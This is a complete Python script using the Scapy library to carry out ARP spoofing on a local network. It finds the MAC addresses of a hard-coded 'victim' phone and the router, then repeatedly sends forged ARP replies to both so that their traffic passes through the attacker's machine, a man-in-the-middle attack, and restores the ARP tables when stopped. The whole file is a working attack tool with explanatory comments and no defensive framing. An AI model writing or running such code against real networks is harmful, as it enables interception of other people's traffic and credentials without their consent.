from scapy.all import *
import time

# --- SETTINGS ---
victim_ip = "192.168.1.100"
router_ip = "192.168.1.1"

# Automatically get Scapy's default interface on Windows
# If it fails, you can manually set it like: conf.iface = "Wi-Fi"
conf.verb = 0

def get_mac(ip):
    """Sends an ARP request to find the MAC address of the target IP."""
    print(f"[*] Searching for MAC address for {ip}...")
    # srp: Send and Receive packets at Layer 2 (Ethernet)
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=3, retry=2)
    for _, rcv in ans:
        return rcv[Ether].src
    return None

def spoof(target_ip, spoof_ip, target_mac):
    """Tricks the target device by claiming 'I am the router' or 'I am the victim'."""
    # hwdst: Real MAC address of the target
    # psrc: The IP address we are impersonating (spoofed IP)
    # hwsrc: Our own MAC address (added automatically)
    packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, verbose=False)

# 1. Acquire MAC Addresses
victim_mac = get_mac(victim_ip)
router_mac = get_mac(router_ip)

if not victim_mac or not router_mac:
    print("[!] Error: MAC addresses not found.")
    print("Hint: Make sure the phone screen is on and connected to Wi-Fi.")
    exit()

print(f"[+] Phone MAC: {victim_mac}")
print(f"[+] Modem MAC: {router_mac}")

# 2. Start the Attack
print("\n[!] ARP Spoofing active! (Press Ctrl+C to stop)")
try:
    while True:
        # Tell the phone "I am the Modem"
        spoof(victim_ip, router_ip, victim_mac)
        # Tell the modem "I am the Phone"
        spoof(router_ip, victim_ip, router_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Stopping... Restoring network to original state.")
    # Restore the legitimate ARP tables so internet connectivity is not lost
    sendp(Ether(dst=victim_mac)/ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, hwsrc=router_mac), count=5)
    sendp(Ether(dst=router_mac)/ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=victim_ip, hwsrc=victim_mac), count=5)